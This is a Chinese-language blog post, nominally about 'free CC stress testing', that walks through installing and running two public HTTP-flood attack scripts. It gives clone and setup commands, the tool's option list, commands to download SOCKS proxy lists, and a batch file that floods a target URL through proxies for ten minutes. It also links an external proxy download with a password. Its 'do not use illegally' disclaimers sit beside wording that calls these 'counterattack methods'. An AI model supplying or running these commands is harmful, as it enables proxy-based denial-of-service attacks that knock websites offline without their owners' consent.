---
title: 如何进行免费的CC压力测试
description: 网站安全压力测试
date: 2023-02-10
image: awa.jpg
slug: cc-gongji
categories: 
    - web
    - 白嫖
tags:
    - 网站测试
    - 网站安全
    - 反击手法
keywords: "CC攻击反击"
lastmod: 2023-04-04 13:16:00
---

# CC压力测试教程

> 仅供测试不要用来做违法的事情

## 脚本介绍

### kolbwang CC-attack（方便但是太老了）

```shell
pip3 install requests pysocks
git clone https://github.com/kolbwang/cc-attack.git
cd cc-attack
```

使用

```shell
python3 cc.py
```

**这个脚本很老了 总是会停攻击**

> 脚本开源库：[GitHub - kolbwang/cc-attack](https://github.com/kolbwang/cc-attack)

### Leeon123 CC-attack

#### 安装（windows）

```shell
pip3 install requests pysocks
git clone https://github.com/Leeon123/CC-attack.git
# 也可以直接下载下来
cd CC-attack
```

#### 用法（Windows）

```shell
python cc.py <arguments>
```

```shell
===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
```

#### 下载代理列表

将 socks5 代理下载为 proxy.txt：

```shell
python cc.py -down -f proxy.txt -v 5
```

使用自定义代理列表（socks4.txt）攻击目标 30 秒：

```shell
python cc.py -url http://target.com -f socks4.txt -v 4 -s 30
```

#### 启动脚本

新建.cmd文件

```batch
# 填入下面的链接 嫌烦就去掉这个注释
python cc.py -url https://网站.com -v 5 -s 600 # 默认是proxy.txt
```

不要用来攻击无辜的网站！！！

> http代理下载
> 
> https://pvphack.lanzoue.com/imPc30n8n9qf  
> 
> 密码:6dh1
> 
> 项目GITHUB链接
> 
> [GitHub - Leeon123/CC-attack: Using Socks4/5 or http proxies to make a multithreading Http-flood/Https-flood (cc) attack.](https://github.com/Leeon123/CC-attack)

不要拿去违法OwO
